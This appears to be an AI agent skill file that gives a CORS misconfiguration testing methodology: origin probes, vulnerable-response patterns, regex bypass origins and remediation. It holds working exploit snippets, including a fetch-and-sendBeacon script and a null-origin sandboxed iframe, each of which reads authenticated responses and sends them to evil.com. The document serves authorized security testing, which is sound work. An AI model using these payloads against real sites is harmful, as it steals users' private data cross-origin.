---
name: offensive-cors
description: "CORS misconfiguration testing. Covers reflected/origin-trusting ACAO, null-origin trust, wildcard with credentials, weak origin regex (prefix/suffix/substring), and exploitation to steal authenticated data cross-origin. Use when assessing APIs that return Access-Control-Allow-Origin headers."
---

# CORS Misconfiguration — Offensive Testing Methodology

## Quick Workflow

1. Send requests with a custom `Origin:` header to API endpoints
2. Inspect `Access-Control-Allow-Origin` (ACAO) and `Access-Control-Allow-Credentials` (ACAC)
3. Identify origin-reflection or weak validation
4. Build a cross-origin PoC that reads authenticated responses

---

## Detection

Send and observe the reflected header:

```
Origin: https://evil.com
→ Access-Control-Allow-Origin: https://evil.com   + ACAC: true   == CRITICAL
```

### Misconfiguration Classes

| Probe Origin | Vulnerable Response |
|---|---|
| `https://evil.com` | ACAO reflects it + `ACAC: true` |
| `null` | `ACAO: null` + `ACAC: true` |
| `https://target.evil.com` | suffix-match regex trusts it |
| `https://evil-target.com` | prefix/substring-match trusts it |
| `https://target.com.evil.com` | naive `startswith` check |

`ACAO: *` **without** credentials leaks only public data (lower severity), but
`*` reflected per-origin **with** credentials is exploitable.

---

## Exploitation

### Steal Authenticated Data

```html
<script>
fetch('https://target/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(d => navigator.sendBeacon('https://evil.com/log', d));
</script>
```

### null-Origin Trust

A sandboxed iframe sends `Origin: null`:

```html
<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://target/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil.com/?'+encodeURIComponent(d)))</script>"></iframe>
```

### Weak Regex Bypass Origins

```
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com
```

---

## Remediation

- Validate `Origin` against a strict allow-list (exact matches only)
- Never reflect arbitrary origins while `Access-Control-Allow-Credentials: true`
- Never trust `null`; do not use wildcard with credentials
- Anchor regexes (`^https://app\.target\.com$`); avoid prefix/suffix matching
